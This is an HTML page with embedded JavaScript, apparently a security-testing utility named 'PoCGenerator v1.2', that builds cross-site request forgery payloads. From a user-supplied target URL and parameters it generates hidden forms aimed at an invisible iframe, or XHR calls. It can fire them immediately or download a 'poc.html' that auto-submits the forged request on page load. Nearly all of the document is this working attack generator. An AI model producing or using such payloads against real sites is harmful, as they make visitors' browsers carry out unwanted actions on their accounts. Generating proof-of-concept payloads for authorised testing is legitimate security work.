<!DOCTYPE html>

<html >
	<head>
		<meta charset="utf-8">
		<meta name="author" content="takubokudori">
		<meta name="description" content="Genrate CSRF PoC form">
		<link rel="author" href="https://github.com/takubokudori" />
		<title>PoC Generator</title>
	</head>
	<body>
		<script>
			var form;

window.onload=function(){
	form=document.forms.messageForm;
}
function URLencode(str){
	if(typeof str !== 'string') return str;
	return encodeURIComponent(str.replace(/\r?\n/g,"\r\n"));
}
function URLdecode(str){
	if(typeof str !== 'string') return str;
	return decodeURIComponent(str.replace(/\+/g,'%20'));
}

function escapeHTML(str) {
	if(typeof str !== 'string') return str;
	return str.replace(/[&'`"<>\n\r]/g, function(match) {
		return {
			'\r': '&#x0D',
			'\n': '&#x0A',
			'&': '&amp;',
			"'": '&#x27;',
			'`': '&#x60;',
			'"': '&quot;',
			'<': '&lt;',
			'>': '&gt;',
		}[match]
	});
}

function escapeJavascript(str){
	return str.replace(/['"\\\n\r]/g, function(match) {
		return {
			'\r': '\\r',
			'\n': '\\n',
			"'": '\\\'',
			'"': '\\\"',
			"\\": '\\\\',
		}[match]
	});
}

function escapeJavascriptCRLF(str){
	return str.replace(/[\n\r]/g, function(match) {
		return {
			'\r': '\\r',
			'\n': '\\n',
		}[match]
	});
}

function errorMsg(msg){
	if(typeof str === 'string') return msg;
	document.getElementById("errormsg").innerText=msg;
}

function generateXHR(isSubmit){
	var req=getSet();
	if(req===false)return;
	var ezhtml="";
	ezhtml+="function csrfXHR(){\n";
	ezhtml+="var xhr=new XMLHttpRequest();\n";
	ezhtml+="xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
	ezhtml+="xhr.setRequestHeader('Content-Type','"+req['enctype']+"');\n";
	ezhtml+="xhr.send('"+escapeJavascriptCRLF(getParamsRaw())+"');\n";
	ezhtml+="}\n";
	setEvilTextContent(ezhtml,true);
	setEvilHTMLcontent(ezhtml);
}

function setEvilHTMLcontent(ezhtml){
	document.getElementById("evilzone").innerHTML=ezhtml;

}

function setEvilTextContent(ezhtml,isScript=false){
	if(isScript) ezhtml="<"+"script>\n"+ezhtml+"</"+"script>\n";
	document.getElementById("nowhtml").innerText=ezhtml;
}

function generatePoC(){
	var sm=form.sendmethod.value;
	if(sm=="form"){
		generateForm();
	}
	else if(sm=="xhr"){
		generateXHR();
	}
}
function getSet(){
	var url=getURL();
	if(url==""){
		errorMsg("URL is empty!");
		return false;
	}
	var method=getMethod();
	if(method==""){
		errorMsg("method is empty!");
		return false;
	}
	var enctype=getEnctype();
	if(enctype==""){
		errorMsg("enctype is empty!");
		return false;
	}
	var params=getParams();
	if(params==false){
		errorMsg("params is empty!");
		return false;
	}
	return {
		'url':url,
		'method':method,
		'enctype':enctype,
		'params':params
	};
}
function getURL(){
	return form.url.value;
}

function getMethod(){
	return form.method.value;
}

function getEnctype(){
	return form.enctype.value;
}

function getParamsRaw(){
	return form.params.value;
}

function getParams(){
	var params=getParamsRaw();
	if(params=="")return false;
	var param=params.split("&");
	var dict=[];
	for(var i in param){
		var t=param[i].split("=");
		dict.push(t);
	}
	return dict;
}

function generateForm(){
	var ez=document.getElementById("evilzone");
	var ezhtml="";
	var req=getSet();
	if(req===false)return;
	ezhtml+='<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="'+ req['enctype'] +'">\n';
	var params=req['params'];
	for(var i in params){
		ezhtml+='<input type="hidden" name="'+escapeHTML(URLdecode(params[i][0]))+'" value="'+escapeHTML(URLdecode(params[i][1]))+'" />\n';
	}
	ezhtml+='</form>\n';
	ezhtml+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
	ez.innerHTML=ezhtml;

	document.getElementById("nowhtml").innerText=ezhtml;
	errorMsg("");
}

function sendPoC(){
	var sm=form.sendmethod.value;
	if(sm=="form"){
		sendForm();
	}
	else if(sm=="xhr"){
		sendXHR();
	}
}

function sendForm(){
	var req=getSet();
	document.getElementById("stat").innerHTML+="<p>Request sent.</p><p>"+escapeHTML(req['url'])+"</p><p>"+escapeHTML(req['params'])+"</p><hr />";
	var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
	submit();
}

function sendXHR(){
	eval(document.getElementById("evilzone").innerText);
	csrfXHR();
}

function executeDownload(name,content,mimeType){
	var blob = new Blob([content], {type : mimeType});

	var a = document.createElement('a');
	a.download = name;
	a.target   = '_blank';
	if (window.navigator.msSaveBlob) {
		window.navigator.msSaveBlob(blob, name)
	}
	else if (window.URL && window.URL.createObjectURL) {
		a.href = window.URL.createObjectURL(blob);
		document.body.appendChild(a);
		a.click();
		document.body.removeChild(a);
	}
	else if (window.webkitURL && window.webkitURL.createObject) {
		a.href = window.webkitURL.createObjectURL(blob);
		a.click();
	}
	else {
		window.open('data:' + mimeType + ';base64,' + window.Base64.encode(content), '_blank');
	}
}

function getHTMLheader(title="CSRF PoC"){
	var content='<!DOCTYPE html>\n\n';
	content+='<html>\n';
	content+='<head>\n';
	content+='<meta charset="utf-8">\n';
	content+='<title>'+title+'</title>\n';
	content+='</head>\n';
	return content;
}

function getHTMLfooter(){
	var content='</html>\n';
	return content;
}

function generateXHRHTML(title,bodyhtml){
	var content=getHTMLheader(title);
	content+='<body onload="csrfXHR();">\n';
	content+=bodyhtml;
	content+='\n<p>'+title+'</p>\n';
	content+='</body>\n';
	content+=getHTMLfooter();
	return content;
}

function generateFormHTML(title,bodyhtml){
	var content=getHTMLheader(title);
	content+='<body onload="document.evilform.submit();">\n';
	content+=bodyhtml;
	content+='\n<p>'+title+'</p>\n';
	content+='</body>\n';
	content+=getHTMLfooter();
	return content;
}

function downloadHTML(){
	var nh=document.getElementById("nowhtml");
	if(nh.innerText==""){
		errorMsg("No downloadable HTML! generate form!");
		return;
	}
	var title=form.title.value;
	var sm=form.sendmethod.value;
	var content="";
	if(sm=="form"){
		content=generateFormHTML(title,nh.innerText);
	}
	else if(sm=="xhr"){
		content=generateXHRHTML(title,nh.innerText);
	}else{
		errorMsg("No downloadable HTML! specify send method!");
		return;
	}
	var title=document.messageForm.title.value;

	var mimeType='text/plain';
	var name="poc.html";
	executeDownload(name,content,mimeType);
}
		</script>
		<h1>PoCGenerator v1.2</h1>

		<div>
			URLencode:<textarea id="uea" name="urlencodearea" rows="1" cols="60"></textarea>
			<button name="encodeIT" onclick="document.getElementById('uea').value=URLencode(document.getElementById('uea').value);return false;" >URL encode</button>
		</div>
		<hr>


		<span id="errormsg"></span>

		<form name="messageForm">
			send : <input type="radio" name="sendmethod" id="use form" value="form" checked><label for="use form">Form</label><input type="radio" name="sendmethod" id="use xhr" value="xhr"><label for="use xhr">XHR</label> <br />
			URL:<input type="text" name="url" size="50" /> <br />
			method: <input type="text" name="method" size="8" value="POST" /><br />
			enctype: <select name="enctype">
				<option value="application/x-www-form-urlencoded" selected>application/x-www-form-urlencoded (default)</option>
				<option value="multipart/form-data">multipart/form-data</option>
				<option value="text/plain">text/plain</option>
			</select><br />
			params:<br />
			<textarea name="params" rows="6" cols="60" ></textarea><br />
			<button name="postmessage" onclick="generatePoC();sendPoC();return false;" >generate and submit</button>
			<button name="postmessage" onclick="generatePoC();return false;" >generate only</button><br />
			title:<input type="text" name="title" size="20" value="CSRF PoC" />
			<button name="downloadhtml" onclick="generatePoC();downloadHTML();return false;" >download HTML</button>
		</form>
		<div id="evilzone" style="visibility:hidden"></div>
		<hr />
		<div id="nowhtml"></div>
		<hr />
		<p id="stat"></p>
	</body>
</html>
